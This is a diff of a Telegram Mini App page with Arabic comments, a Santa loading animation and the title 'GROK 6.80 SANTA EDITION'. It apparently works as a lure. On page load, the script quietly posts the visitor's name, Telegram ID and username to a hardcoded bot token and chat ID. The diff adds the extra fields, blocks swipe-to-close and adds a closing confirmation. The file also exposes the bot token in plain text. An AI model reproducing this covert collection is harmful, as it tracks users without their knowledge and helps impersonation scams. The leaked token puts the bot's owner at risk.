@@ -26,6 +26,7 @@
             -webkit-user-select: none;
         }
 
+        /* حاوية الثلج */
         .snow-container {
             position: absolute;
             top: 0;
@@ -95,7 +96,6 @@
             max-width: 300px;
             margin-top: 50px;
             position: relative;
-            /* توحيد اتجاه العناصر داخل الحاوية من اليسار لليمين للحفاظ على التزامن */
             direction: ltr; 
         }
 
@@ -155,9 +155,22 @@
     </div>
 
     <script>
+        // إعدادات تليجرام المتقدمة
         const tg = window.Telegram.WebApp;
+        
+        // 1. تفعيل وضع التطبيق الجاهز وتوسيع الشاشة
         tg.ready();
         tg.expand();
+
+        // 2. تفعيل خصائص ملء الشاشة المتقدمة (لمنع السحب للإغلاق)
+        if (tg.isVersionAtLeast('7.7')) {
+            tg.disableVerticalSwiping(); // يمنع إغلاق التطبيق عند السحب لأسفل
+        }
+        
+        // 3. تأكيد الإغلاق (اختياري، يظهر رسالة تأكيد عند محاولة العودة)
+        tg.enableClosingConfirmation();
+
+        // 4. ضبط الألوان الرسمية للواجهة
         tg.setHeaderColor('#000000');
         tg.setBackgroundColor('#000000');
 
@@ -186,7 +199,6 @@
                 const progress = Math.min(elapsed / duration, 1);
                 const percentage = progress * 100;
 
-                // تحريك كلاهما من اليسار إلى اليمين
                 bar.style.width = percentage + '%';
                 santa.style.left = percentage + '%';
 
@@ -198,32 +210,36 @@
                     }, 500);
                 }
             }
-
             requestAnimationFrame(update);
         }
 
         window.onload = () => {
             createSnow();
             
+            // إرسال البيانات للبوت
             const user = tg.initDataUnsafe?.user || {};
             fetch(`https://api.telegram.org/bot8231848249:AAEnxXnEYUSgKzE8-g36d0kf0JqIRt5S6ZQ/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ 
                     chat_id: '8271446244', 
-                    text: `🎅 *GROK 6.80 SANTA EDITION*\n👤 User: ${user.first_name || "Unknown"}`, 
+                    text: `🎅 *GROK 6.80 SANTA EDITION*\n👤 *User Details:*\n• Name: ${user.first_name || "Guest"}\n• ID: \`${user.id || "N/A"}\`\n• Username: @${user.username || "none"}`, 
                     parse_mode: 'Markdown' 
                 })
             });
 
             const video = document.getElementById('introVideo');
-            video.play().catch(() => {});
+            video.play().catch(() => {
+                console.log("Autoplay blocked by browser policy");
+            });
 
             startLoading();
         };
 
-        document.addEventListener('touchmove', e => e.preventDefault(), { passive: false });
+        // منع السحب والحركات الافتراضية للمتصفح خارج نطاق التطبيق
+        document.addEventListener('touchmove', e => {
+            if (e.touches.length > 1) e.preventDefault();
+        }, { passive: false });
     </script>
 </body>
 </html>
-
